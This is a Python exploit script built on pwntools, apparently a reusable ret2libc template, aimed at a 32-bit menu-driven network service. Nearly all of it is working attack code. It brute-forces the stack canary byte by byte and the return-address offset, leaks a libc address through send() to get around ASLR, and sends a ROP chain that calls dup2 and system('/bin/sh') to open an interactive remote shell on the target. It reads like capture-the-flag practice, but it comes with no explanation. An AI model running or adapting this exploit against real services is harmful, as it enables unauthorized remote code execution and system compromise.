# -*- coding: utf-8 -*-

#
# Name: generic_ret2libc
#
# Author: Autonomoid
# Modification date: 2024-10-01
# Licence: GPL 2.0
#

from pwn import *
from ropper import RopperService
import os
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

###############################################################################
############################ NON-GENERIC CODE #################################
###############################################################################

# Target-specific details.
TARGET_IP_ADDRESS = "0.0.0.0"
TARGET_PORT = 8181
BINARY_FILE = 'target_binary'
LIBC_FILE = '/lib/i386-linux-gnu/libc.so.6'

###############################################################################

# Binary-specific details

def setup_function(conn):
    """
    Prepare the binary to accept the buffer overflow.
    """
    conn.recvuntil('Select menu > ')
    conn.sendline('1')
    conn.recvuntil('Message : ')

def exit_function(conn):
    """
    Exit the binary cleanly.
    """
    conn.recvuntil('Select menu > ')
    conn.sendline('3')

###############################################################################
############################# GENERIC CODE ####################################
###############################################################################

def send_function(payload):
    """
    Sends a payload to the target service and checks if it was successful.
    """
    try:
        conn = remote(TARGET_IP_ADDRESS, TARGET_PORT)
        setup_function(conn)
        conn.send(payload)
        exit_function(conn)
        data = conn.recvall()
        conn.close()
        return data.count(b'G') > 0
    except Exception as e:
        log.error(f"Error connecting to {TARGET_IP_ADDRESS}:{TARGET_PORT} - {e}")
        return False

def guess_offset(initial_payload=''):
    """
    Brute-force to find the buffer offset for the stack canary.
    """
    offset = 0
    is_safe = True
    while is_safe:
        log.info(f"[+] Offset: {'#' * offset} ({offset})")
        offset += 1
        payload = initial_payload + 'A' * offset

        is_safe = send_function(payload)
    return offset - 1

def guess_canary(canary_offset):
    """
    Brute-force the stack canary value byte by byte.
    """
    canary_length = 4
    canary = b''
    while len(canary) < canary_length:
        for byte in range(256):  # Brute force each byte (0 to 255)
            payload = b'A' * canary_offset + canary + bytes([byte])
            if send_function(payload):
                canary += bytes([byte])
                log.info(f"[+] Canary so far: {canary.hex()}")
                break
    return canary

###############################################################################

def retrieve_or_guess_canary():
    """
    Get the stack canary from cache or brute-force it.
    """
    canary_file = '/tmp/canary'
    
    if os.path.isfile(canary_file):
        with open(canary_file, 'r') as temp:
            canary_offset = int(temp.readline().strip())
            canary = temp.read()
            log.info(f"[+] Cached canary offset = {canary_offset}")
            log.info(f"[+] Cached canary value  = {canary}")
            return canary_offset, canary
    else:
        canary_offset = guess_offset()
        canary = guess_canary(canary_offset)
        with open(canary_file, 'w') as temp:
            temp.write(f"{canary_offset}\n")
            temp.write(canary.decode('latin1'))
        return canary_offset, canary

###############################################################################

def retrieve_or_guess_return_address_offset(canary_offset, canary):
    """
    Find the return address offset by brute-forcing it, or retrieve it from a cache.
    """
    offset_file = '/tmp/return_address_offset'
    
    if os.path.isfile(offset_file):
        with open(offset_file, 'r') as temp:
            return_address_offset = int(temp.readline().strip())
            log.info(f"[+] Cached return address offset = {return_address_offset}")
            return return_address_offset
    else:
        initial_payload = b'A' * canary_offset + canary
        return_address_offset = guess_offset(initial_payload)
        with open(offset_file, 'w') as temp:
            temp.write(f"{return_address_offset}\n")
        return return_address_offset

###############################################################################

def make_infoleak_payload(canary, canary_offset, return_address_offset, send_address, socket_fd, address_to_leak):
    """
    Create payload for leaking information from memory using a known address.
    """
    payload = b'A' * canary_offset
    payload += canary
    payload += b'B' * return_address_offset
    payload += p32(send_address)
    payload += b'XXXX'
    payload += p32(socket_fd)
    payload += p32(address_to_leak)
    payload += p32(4)  # Length of leak
    payload += p32(0)  # Unused argument
    return payload

###############################################################################

def infoleak(conn, infoleak_payload):
    """
    Use the infoleak payload to extract data from the target binary.
    """
    setup_function(conn)
    conn.send(infoleak_payload)
    exit_function(conn)
    leaked_data = conn.recv(4)
    conn.close()
    return u32(leaked_data.ljust(4, b'\x00'))

###############################################################################

def calculate_libc_base(leaked_data, libc_file):
    """
    Calculate the base address of libc using the leaked data.
    """
    libc = ELF(libc_file)
    libc_offset = libc.symbols['__libc_start_main']
    libc_base = leaked_data - libc_offset
    log.info(f"[+] libc base address = {hex(libc_base)}")
    return libc_base, libc

###############################################################################

def find_pop_pop_ret(binary_file):
    """
    Find the address of a 'pop, pop, ret' gadget using ropper.
    """
    rs = RopperService()
    rs.addFile(binary_file)
    rs.options.type = 'rop'
    rs.loadGadgetsFor()
    gadgets = rs.searchPopPopRet()
    return gadgets.items()[0][1][0].address

###############################################################################

def make_exploit_payload(canary, canary_offset, return_address_offset, libc_base, libc, binary, pop_pop_ret_address):
    """
    Build the final ROP chain that will execute the exploit and spawn a shell.
    """
    stdin_fd = 0
    stdout_fd = 1
    socket_fd = 4

    dup2_address = libc_base + libc.symbols['dup2']
    system_address = libc_base + libc.symbols['system']
    bin_sh_address = libc_base + next(libc.search(b"/bin/sh"))

    rop_chain = b'A' * canary_offset
    rop_chain += canary
    rop_chain += b'B' * return_address_offset

    # dup2(socket_fd, stdin_fd)
    rop_chain += p32(dup2_address) + p32(pop_pop_ret_address)
    rop_chain += p32(socket_fd) + p32(stdin_fd)

    # dup2(socket_fd, stdout_fd)
    rop_chain += p32(dup2_address) + p32(pop_pop_ret_address)
    rop_chain += p32(socket_fd) + p32(stdout_fd)

    # system("/bin/sh")
    rop_chain += p32(system_address) + b'XXXX' + p32(bin_sh_address)

    return rop_chain

###############################################################################

def exploit_binary(canary, canary_offset, return_address_offset, libc_base, libc, binary, pop_pop_ret_address):
    """
    Execute the exploit by sending the payload to the target binary.
    """
    conn = remote(TARGET_IP_ADDRESS, TARGET_PORT)
    exploit_payload = make_exploit_payload(
        canary, canary_offset, return_address_offset,
        libc_base, libc, binary, pop_pop_ret_address)
    setup_function(conn)
    conn.send(exploit_payload)
    exit_function(conn)
    conn.interactive()

###############################################################################
############################ MAIN EXECUTION ###################################
###############################################################################

def main():
    """
    Main function to coordinate the exploit process.
    """
    binary = ELF(BINARY_FILE)

    # Retrieve canary and offsets (brute-force if not cached)
    canary_offset, canary = retrieve_or_guess_canary()
    return_address_offset = retrieve_or_guess_return_address_offset(canary_offset, canary)

    # Leak libc address
    send_address = binary.symbols['send']
    address_to_leak = binary.symbols['got.__libc_start_main']
    infoleak_payload = make_infoleak_payload(canary, canary_offset, return_address_offset, send_address, 4, address_to_leak)
    conn = remote(TARGET_IP_ADDRESS, TARGET_PORT)
    leaked_data = infoleak(conn, infoleak_payload)

    # Calculate libc base address
    libc_base, libc = calculate_libc_base(leaked_data, LIBC_FILE)

    # Find ROP gadgets
    pop_pop_ret_address = find_pop_pop_ret(BINARY_FILE)

    # Exploit the binary
    exploit_binary(canary, canary_offset, return_address_offset, libc_base, libc, binary, pop_pop_ret_address)

if __name__ == '__main__':
    main()
